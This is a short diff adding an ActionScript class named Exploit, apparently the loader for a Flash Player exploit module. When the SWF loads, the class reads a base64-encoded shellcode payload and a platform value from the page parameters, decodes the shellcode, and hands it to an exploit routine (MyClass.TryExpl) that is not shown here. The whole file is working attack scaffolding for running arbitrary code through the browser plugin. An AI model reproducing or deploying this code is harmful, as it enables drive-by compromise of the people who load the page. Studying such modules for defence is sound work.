@@ -1,0 +1,34 @@
+package 
+{
+	import flash.display.Sprite
+	import flash.events.Event
+	import mx.utils.Base64Decoder
+	import flash.display.LoaderInfo
+	import flash.utils.ByteArray
+	
+	public class Exploit extends Sprite 
+	{
+		private var b64:Base64Decoder = new Base64Decoder()
+        private var payload:ByteArray
+        private var platform:String
+		
+		public function Exploit():void 
+		{
+            if (stage) init();
+            else addEventListener(Event.ADDED_TO_STAGE, init);
+		}
+		
+		private function init(e:Event = null):void 
+		{
+            platform = LoaderInfo(this.root.loaderInfo).parameters.pl
+            var b64_payload:String = LoaderInfo(this.root.loaderInfo).parameters.sh
+            var pattern:RegExp = / /g;
+            b64_payload = b64_payload.replace(pattern, "+")
+            b64.decode(b64_payload)
+            payload = b64.toByteArray()
+
+            removeEventListener(Event.ADDED_TO_STAGE, init);
+            MyClass.TryExpl(this, platform, payload, 1)
+		}
+	}
+}
